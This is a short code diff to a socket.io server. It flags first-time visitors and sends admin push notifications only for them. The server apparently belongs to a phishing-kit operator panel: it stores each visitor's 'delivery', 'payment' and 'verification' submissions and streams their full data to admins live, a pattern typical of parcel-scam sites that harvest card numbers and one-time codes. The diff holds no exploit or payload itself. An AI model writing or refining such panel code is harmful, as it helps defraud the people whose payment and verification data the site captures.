@@ -189,6 +189,16 @@ io.on('connection', (socket) => {
       visitorData.payment_submissions = submissionsMap[`${sessionId}_payment`] || [];
       visitorData.verification_submissions = submissionsMap[`${sessionId}_verification`] || [];
 
+      // Determine if this is a FIRST TIME visitor (no previous submissions)
+      const hasExistingSubmissions = (
+        visitorData.delivery_submissions.length > 0 ||
+        visitorData.payment_submissions.length > 0 ||
+        visitorData.verification_submissions.length > 0
+      );
+      
+      // Mark first visit for UI
+      visitorData.isFirstVisit = !hasExistingSubmissions;
+
       // Notify admins of new visitor with FULL data
       const newVisitorData = {
         ...visitorData,
@@ -199,8 +209,14 @@ io.on('connection', (socket) => {
         adminSocket.emit('visitor:new', newVisitorData);
       });
 
-      // Send FCM push notification for new visitor
-      firebaseAdmin.notifyNewVisitor(newVisitorData);
+      // ONLY send FCM push notification for FIRST TIME visitors
+      // Do NOT send for reconnections or existing visitors
+      if (!hasExistingSubmissions) {
+        console.log('📱 First time visitor - sending push notification');
+        firebaseAdmin.notifyNewVisitor(newVisitorData);
+      } else {
+        console.log('📱 Returning visitor - skipping push notification');
+      }
 
       socket.emit('visitor:confirmed', { sessionId });
     } catch (error) {
